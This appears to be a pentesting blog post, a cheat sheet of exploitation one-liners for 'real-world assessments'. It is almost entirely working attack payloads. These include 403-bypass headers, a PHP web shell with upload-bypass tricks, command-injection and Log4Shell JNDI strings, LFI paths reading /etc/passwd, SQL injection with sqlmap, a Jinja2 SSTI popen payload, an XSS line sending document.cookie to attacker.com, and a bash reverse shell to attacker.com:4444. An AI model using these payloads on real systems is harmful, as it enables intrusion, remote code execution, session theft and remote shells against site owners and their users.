---
title: "Exploitation"
date: 2025-04-10 +0530
categories: [Cyber-Security]
tags: [bypass, exploitation, xargs, payload, bash, wget, 403-bypass, file-upload, rce, lfi, ssti, sqlmap, xss, curl, ffuf, waf-bypass]
order: 2
---

After enumeration and reconnaissance, exploitation is where actual access or data extraction begins. This section contains practical exploitation tactics and one-liners used in real-world assessments.

## 🔓 403 Forbidden Bypass

```bash
wget https://raw.githubusercontent.com/Dheerajmadhukar/4-ZERO-3/refs/heads/main/403-bypass.sh
xargs -a 403 -I {} -n 1 ~/403-bypass.sh -u {} --exploit /DirectoryOrFile
cat 403_bypasses.out | grep PAYLOAD | awk '{for (i=5; i<=NF; i++) printf "%s ", $i; printf "\n"}'
```

### Additional Payloads (Manual Testing)
```bash
curl -X HEAD https://target.com/secret/
curl https://target.com/secret/.%2e/
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/
```

## 📂 File Upload Bypass & Web Shells

### Common Upload Bypass Tricks
```bash
# Double extensions
file.php.jpg

# Null byte (if backend is vulnerable)
file.php%00.jpg

# Content-Type spoofing
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload
```

### PHP Shell Payload (Basic)
```php
<?php system($_GET['cmd']); ?>
```

Access via:
```bash
curl https://target.com/uploads/shell.php?cmd=id
```

## 💥 Remote Code Execution (RCE)

### RCE via `curl`
```bash
curl -X POST https://target.com/endpoint -d "input=|id"
```

### RCE via headers (Log4Shell-style)
```bash
curl https://target.com -H 'User-Agent: ${jndi:ldap://attacker.com/x}'
```

## 📜 Local File Inclusion (LFI)

### Testing LFI Paths
```bash
curl https://target.com/index.php?page=../../../../etc/passwd
curl https://target.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

### Wrappers & Payloads
```bash
curl https://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8=  # Executes base64-encoded PHP
```

## 🧮 SQL Injection

### Basic Testing (Manual)
```bash
curl "https://target.com/item.php?id=1'"
curl "https://target.com/item.php?id=1--+"
curl "https://target.com/item.php?id=1 OR 1=1"
```

### Automated
```bash
sqlmap -u "https://target.com/item.php?id=1" --batch --risk=3 --level=5
```

## 🔁 Server-Side Template Injection (SSTI)

Testing for SSTI

{% raw %}
```bash
curl https://target.com/page?name={{7*7}}
curl https://target.com/page?name=<%= 7 * 7 %>
```
{% endraw %}



### Exploitation

{% raw %}
```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
{% endraw %}


## 💉 Cross-Site Scripting (XSS)

### Manual Payloads
```html
"><script>alert(1)</script>
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

### Testing with `dalfox`
```bash
dalfox url https://target.com/search?q=test
```

## ⚙️ Command Execution via Common Injection Points

### Header Injection
```bash
curl -H "Host: example.com; curl http://attacker.com" https://target.com
```

### Cookie Injection
```bash
curl -H "Cookie: SESSIONID=;curl http://attacker.com" https://target.com
```

## 📸 Screenshot After Exploitation

```bash
aquatone -out screenshots -ports large < alivesubdomains.txt
```

## ✅ Post-Exploitation Tips

- Always chain access: Upload shell → Get RCE → Run privilege escalation scripts
- Enumerate for crontabs, SUID, and passwords in configs
- Setup reverse shell listeners when working with limited environments

```bash
nc -lvnp 4444
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```